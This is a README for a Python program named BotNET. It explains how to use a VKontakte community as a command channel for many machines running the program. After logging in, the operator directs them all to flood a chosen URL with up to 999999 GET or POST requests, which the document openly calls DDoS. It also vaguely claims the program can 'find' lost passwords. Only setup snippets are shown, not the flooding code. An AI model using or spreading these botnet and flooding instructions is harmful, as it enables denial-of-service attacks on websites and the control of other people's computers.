# BotNET



BotNET - is programm that can do GET and POST request on command. Also it can find your lost password if you forget them.

# Installing 

To use BotNET you need to install next libraries:
```
vk_api
requests
shutil
getuser
```

To make BotNET work you need create a public-group in social network "Vkontakte". Then you copy community token in section "Work with API" in communit settings ad paste it in BotNET.py in variable "token"

Example:
```
from getpass import getuser

token = '4691d8f6706204dafcf4410fb911a1e515b2dc5345623asw42343421ret3441c28d91003cfce' # <- Paste here

vk_session = VkApi(token=token)
vk = vk_session.get_api()
longpoll = VkLongPoll(vk_session)
```

Next you need to specify your "VKontakte" id. To find it you need go to your page and copy numbers after "id"

Example:
```
https://vk.com/id358410283 # You need copy "358410283"
```
Than you paste it into peer_id in function "message"

Example:
```
def message(message):
    vk.messages.send(
        peer_id = '358410283', # <- here
        message = message,
        random_id = get_random_id(),
    )
```

# Functional 

To start work with BotNET you need to run BotNET.py and write message to your community in "VKontakte" with text: your username + 16080305 (its password that can be changed in BotNET.py) where your username is name of your computer.

Example:
```
Reeuds 16080305
```

When you write your username + password community write you that you logined in and you can use commands.

# Commands

Here's be all comands that your BotNET can do

# DDoS

In POST/GET requests panel you can see 2 type of requests POST and GET(captain obvious)
```
1. To make GET requests you need write "GET" after entering in requests panel.
2. When you write "GET" you need to paste link to which requests will be made.
3. Next you writing link you need to write count of requests(from 1 to 999999)
```
After writing all information BotNET beging do requests.

With POST requests be a litle bit harder
```
1. To make POST requests you need write "POST" after entering in requests panel.
2. After writing link you need to write "data" of POST request(data is cortage of information that request transmitt to server).
3. Next step you need again write count of requests(from 1 to 999999)
```
After writing all information BotNET beging do requests.

After end of sending requests you need type "Выход" to exit(if you done POST requests you need type "Выход" 2 times).

# Check 

Where you type "Check" to your BotNET him check for new users that now have runned BotNET.

What it meens?

You user and you logined as admin. When you type "Check" all other users become online.
When you enter in requests panel other users enter in it too. If you begin sending requests as admin, all other users negin it too.

# online 

That's very easy.

When you type "online" to you community - all users who have runned BotNET right now is shown you
